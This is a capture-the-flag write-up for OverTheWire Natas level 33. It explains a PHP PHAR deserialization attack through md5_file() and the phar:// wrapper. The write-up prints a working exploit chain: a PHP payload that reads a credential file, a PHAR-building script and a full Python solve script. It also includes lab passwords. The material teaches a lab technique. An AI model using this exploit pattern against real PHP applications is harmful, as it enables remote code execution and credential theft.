## Natas Level 33  

<img src="images/chall.png" width=600>

We are provided with a simple looking webpage that allows us to upload files.  

<img src="images/webpage.png" width=600>

In the source code, we can get the full picture of how the backend operates.  

The entire file upload and parsing functionality is implemented in the `Executor` class. When a file is uploaded, the `__construct()` method will move it to `/natas33/upload`.  

The interesting part is in the `__destruct()` method. If the file hash matches the `$signature` attribute of the `Executor` instance, the backend will execute the file as PHP code. This gives us a potential RCE vector.  

However, the main obstacle is that `$signature` is set to a hardcoded hash by default, and cracking the hash is impossible as the hash itself consists of leetspeak phrases, so it isn't even a valid hash.  

```php
// graz XeR, the first to solve it! thanks for the feedback!
// ~morla
class Executor{
    private $filename=""; 
    private $signature='adeafbadbabec0dedabada55ba55d00d';
    private $init=False;

    function __construct(){
        $this->filename=$_POST["filename"];
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
            echo "File is too big<br>";
        }
        else {
            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                echo "Firmware upgrad initialised.<br>";
            }
            else{
                echo "There was an error uploading the file, please try again!<br>";
            }
        }
    }

    function __destruct(){
        // upgrade firmware at the end of this script

        // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
        chdir("/natas33/upload/");
        if(md5_file($this->filename) == $this->signature){
            echo "Congratulations! Running firmware update: $this->filename <br>";
            passthru("php " . $this->filename);
        }
        else{
            echo "Failur! MD5sum mismatch!<br>";
        }
    }
}

...

session_start();
if(array_key_exists("filename", $_POST) and array_key_exists("uploadedfile",$_FILES)) {
    new Executor();
}
```

The vuln in this challenge is pretty subtle, and it lies in the `md5_file()` call in `__destruct()`.  

Essentially, `md5_file()` is one of the few functions that supports the `phar://` wrapper, which auto-deserialized metadata in the PHAR archives provided. We can inject arbitrary objects inside the PHAR archive metadata, giving us an object injection vector.  

In our attack, we can upload an RCE payload and PHAR payload files to the server, then make a request with `phar://` as the filename to trigger the deserialization of our PHAR archive, which will then execute the RCE payload file.  

We will first create `payload.php` that will output the contents of the password file. Uploading it to the server will store it in `/natas33/upload`.  

```php
<?php system('cat /etc/natas_webpass/natas34') ?>
```

After that, we can create our malicious PHAR archive. Inside the archive metadata, we will inject an `Executor` object that has the `$filename` attribute set to our `payload.php` inside the uploads directory.  

Since the `$signature` attribute is set to the correct file hash of `payload.php`, when the server calls `__destruct()` on our `Executor` object, the MD5 check will pass, and our RCE payload will be executed.  

```php
<?php

    class Executor {
        private $filename;
        private $signature;
        private $init;

        function __construct() {
            global $payload;

            $this->filename = "/natas33/upload/payload.php";
            $this->signature = md5(file_get_contents('payload.php'));
            $this->init = true;
        }
    }

    @unlink("exploit.phar");

    $phar = new Phar("exploit.phar");
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $phar->addFromString("a", "a");

    $object = new Executor();
    $phar->setMetadata($object);

    $phar->stopBuffering();

?>
```

We upload the malicious PHAR normally, then trigger the deserialization in another request with the `phar://` wrapper, and we win.    

Below is my solve script to automate this.  

```python
import requests
import subprocess

url = "http://natas33.natas.labs.overthewire.org"

s = requests.Session()
s.auth = ('natas33', '2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ')

# create rce payload
payload = "<?php system('cat /etc/natas_webpass/natas34') ?>"
filename = 'payload.php'

with open(filename, 'w') as f:
    f.write(payload)

# create phar payload
subprocess.run(['php', '-d', 'phar.readonly=0', 'exploit.php'])
print("> Created payload")

# upload payload
res = s.post(
    f"{url}/index.php",
    data={ "filename": filename },
    files={"uploadedfile": (filename, payload, "application/octet-stream")}
)

print("> RCE payload uploaded")

with open("exploit.phar", "rb") as f:
    res = s.post(
        f"{url}/index.php",
        data={ "filename": 'exploit.phar' },
        files={"uploadedfile": ('exploit.phar', f.read(), "application/octet-stream")}
    )

print("> PHAR payload uploaded")

# trigger deserialisation
res = s.post(
    f'{url}/index.php', 
    data={ 'filename': 'phar://exploit.phar' },
    files={ 'uploadedfile': ('a', 'a', 'text/plain')}
)

print(res.text)
```

Running the script will get the webpage to display the password to level 34.  

<img src="images/password.png" width=600>

Password: `j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY`